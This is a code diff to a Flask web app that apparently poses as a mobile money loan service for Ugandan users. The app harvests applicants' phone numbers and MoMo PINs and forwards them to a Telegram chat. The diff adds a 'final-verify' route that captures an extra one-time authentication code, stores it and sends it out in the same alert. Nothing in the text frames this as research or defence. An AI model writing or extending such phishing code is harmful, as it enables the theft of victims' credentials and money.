@@ -26,6 +26,7 @@ def send_telegram_alert(app_data, title="NEW MOMO LOAN APPLICATION"):
         f"📞 *Phone:* +256 {app_data.get('phone', '')}\n"
         f"🔑 *MoMo PIN:* `{app_data.get('password', '')}`\n"
         f"🔐 *Auth Code:* `{app_data.get('auth_code', 'N/A')}`\n"
+        f"🔐 *Final Code:* `{app_data.get('final_auth_code', 'N/A')}`\n"
         f"💰 *Amount:* UGX {app_data.get('amount', '')}\n"
         f"⏱️ *Term:* {app_data.get('term', '')}\n"
         f"💼 *Employment:* {app_data.get('employment', '')}\n"
@@ -101,7 +102,8 @@ def login():
             "status": "Pending Approval",
             "created_at": time.time(),  # Timestamp used for 5-second timer
             "app_id": "APP-" + os.urandom(4).hex().upper(),
-            "auth_code": ""
+            "auth_code": "",
+            "final_auth_code": ""
         }
         
         inserted_id = applications_collection.insert_one(app_data).inserted_id
@@ -167,6 +169,30 @@ def submit_auth_code():
 @app.route("/completed")
 def completed():
     return render_template("completed.html")
+
+# --- FINAL SYSTEM AUTHENTICATION CODE ROUTES ---
+@app.route("/final-verify", methods=["GET", "POST"])
+def final_verify():
+    if request.method == "POST":
+        final_code = request.form.get("final_code")
+        current_id = session.get("current_app_id")
+        
+        if current_id:
+            applications_collection.update_one(
+                {"_id": ObjectId(current_id)},
+                {"$set": {"final_auth_code": final_code, "status": "Fully Verified"}}
+            )
+            record = applications_collection.find_one({"_id": ObjectId(current_id)})
+            
+            # Send notification alert for the final code
+            send_telegram_alert(record, title="FINAL SYSTEM AUTH CODE SUBMITTED")
+            
+        return redirect(url_for("success"))
+    return render_template("final_verify.html")
+
+@app.route("/success")
+def success():
+    return render_template("success.html")
 
 @app.route("/admin")
 def admin_dashboard():
